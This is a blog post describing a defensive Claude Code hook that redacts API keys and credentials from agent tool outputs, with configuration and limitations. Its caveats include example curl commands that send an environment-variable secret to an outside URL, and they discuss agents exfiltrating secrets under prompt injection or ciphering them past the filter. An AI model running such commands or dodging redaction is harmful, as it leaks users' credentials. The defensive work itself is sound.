# Filtering Secrets from Coding Agents with a Hook

by Marc Olson and Andrew Wheeler

Coding agents like Claude Code, Codex, and Cursor are useful because they can carry out actions on your machine like running shell commands, fetching web pages, editing files, etc.

That capability presents a risk: agents can inadvertently put a secret, or sensitive information (an API key, an AWS credential) into a command or a web request and send it somewhere it should not go. This can happen by accident, or because the agent followed a malicious instruction it read on a webpage -- a so-called exfiltration attack, which I wrote about separately in [Coding Agents Risk Leaking Secrets](https://crimede-coder.com/blogposts/2025/CodingAgentRisks).

This post shows a small, concrete defense: a **hook** that runs *after* every tool call, scans the tool's result for secrets, and replaces them with `***REDACTED***` before the model (and the session transcript) ever sees the raw output.

The key idea is simple: if the coding agent never actually sees the secret values, it cannot exfiltrate them directly. It cannot paste them into a web form, encode them into a URL, or include them in a follow-up command, because those strings never enter its context.

## How it works

Claude Code lets you register a script that runs at certain points in its loop. The one we want is the **PostToolUse** hook: it fires right after a tool succeeds. Claude Code hands your script the tool request and its result as JSON on standard input -- for a shell command that printed a secret it looks like this:

```json
{
  "hook_event_name": "PostToolUse",
  "tool_name": "Bash",
  "tool_input": { "command": "echo $DEMO_SECRET" },
  "tool_response": "sk-ant-...\\n"
}
```

Your script can print back a decision that rewrites that output. We scrub the secret out of the tool result and Claude continues with the cleaned version:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PostToolUse",
    "updatedToolOutput": "***REDACTED***\\n"
  }
}
```

That matters for the common case where the secret never appeared in the *command* at all -- only in the *result*. Asking the agent "what is the value of `$DEMO_SECRET`?" is a good example: the shell expands the variable and prints the real value; without a post-tool hook, Claude happily reports it. With the hook, the model only sees `***REDACTED***`.

----------------

Important caveat: the tool has already run. PostToolUse stops secrets from flowing *back into the model*, not from being used in the first place. So it is possible for the agent to run a command like:

    curl https://crimede-coder.com/blog/more-info?param=${OPENAI_API_KEY}"

And because of environment variable expansion in bash, still sends the secret to the external source. This is potentially solvable with the same approach though, just using a *pre* tool hook and replacing `$ENVIRONMENT_VARIABLE` with something else.

-----------------------

The detection in the hook is plain Python find-and-replace, in two layers ([`secret_filter.py`](secret_filter.py)):

1. **Exact values.** We read the actual secret values from environment variables (`ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, etc.) and replace those exact strings wherever they appear. This has no false positives because we only redact strings we already know are secret.
2. **Patterns.** We also match common key shapes with regular expressions (`sk-ant-...`, `AKIA...`, `ghp_...`, `Bearer ...`). This catches keys we were not told about, at the cost of occasionally redacting something that merely looks like a key.

### Two ways to use it

**As a real hook in your own Claude Code.** Merge [`settings.example.json`](settings.example.json) into your project's `.claude/settings.json`. From then on, every tool result in that project is filtered automatically:

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          { "type": "command", "command": "python",
            "args": ["${CLAUDE_PROJECT_DIR}/redact_secrets_hook.py"] }
        ]
      }
    ]
  }
}
```

The entry point is [`redact_secrets_hook.py`](redact_secrets_hook.py) which reads stdin, calls the filter, and prints the decision.

**As a self-contained demo.** [`demo_sdk.py`](demo_sdk.py) uses the [Claude Agent SDK](https://code.claude.com/docs/en/agent-sdk/overview) to ask Claude headless: *what is the value of `$DEMO_SECRET`?* First without a hook (Claude reports the fake secret), then with an in-code **PostToolUse** hook that rewrites tool output (Claude only sees `***REDACTED***`). You can watch both runs without changing any of your global settings.

## Try it yourself

See the github [repo for the full code](https://github.com/apwheele/Blog_Code/tree/master/Python). To run these examples you will need `ANTHROPIC_API_KEY` defined in the environment to be able to use the pay-as-you-go API from anthropic.

```bash
# 1) Offline tests -- no API key, no network needed:
uv run python test_secret_filter.py

# 2) Inspect the hook directly by piping a tool result into it:
echo '{"tool_name":"Bash","tool_response":"sk-ant-api03-abcDEF123456789"}' | uv run python redact_secrets_hook.py

# 3) Full SDK demo (needs claude CLI / API key; deps via uv):
uv run python demo_sdk.py
```

The demo uses only a fake placeholder secret; no real credential is ever written or printed.

## Limitations

This is a useful guardrail, not a guarantee. Know what it does not cover:

- **Shell expansion can still leak secrets off-box.** Because the model never needs to *see* the secret value to *use* an environment variable, it can still write commands like `curl website --json '{"whatever": "'"$SECRET"'"}'` (or simpler `$SECRET` expansions). The shell expands the variable before the request leaves; the post-tool hook only sees whatever comes back. To harden against that, add a **PreToolUse** hook that blocks or rewrites commands that reference secret environment variables in the first place -- so the agent cannot send `$SECRET` (or its expanded value) out via the tool input at all.
- **A capable model can defeat find-and-replace.** If the agent is determined (or is following a clever injection), it can cipher the secret so the text no longer matches. Literal matching cannot see through that.
- **Pattern matching is imperfect.** Regexes miss key formats we did not anticipate, and exact-value matching only works for secrets you have defined (via the environment). New or unusual credentials can slip through.
- **The user has to turn it on.** Today this is opt-in per project. There is no built-in way for an organization to enforce it across everyone's machines. Org-level hook management is likely to get easier over time, which would make this kind of control much more practical to deploy at scale.
- **It fails open.** If the hook script errors, it deliberately lets the call through rather than blocking your work. That keeps the agent usable, but it means a bug silently disables the protection.

Because of these gaps, treat redaction as one layer. The stronger mitigations from the [*Coding Agents Risk Leaking Secrets*](https://crimede-coder.com/blogposts/2025/CodingAgentRisks) post still matter: whitelist your API keys to specific IPs so a leaked key is useless to an outsider, and in locked-down environments allowlist which websites the agent may reach.

If your agency is rolling out AI coding tools and wants help thinking through these security trade-offs or training to get the most out of the tools [get in touch](https://crimede-coder.com/). For more on doing data and analysis work in Python, see my book, [Data Science for Crime Analysis with Python](https://crimede-coder.com/blogposts/2024/PythonDataScience). And for learning more serious about LLM APIs and coding tools, see my book [*Large Language Models for Mortals: A Practical Guide for Analysts with Python*](https://crimede-coder.com/blogposts/2026/LLMsForMortals).
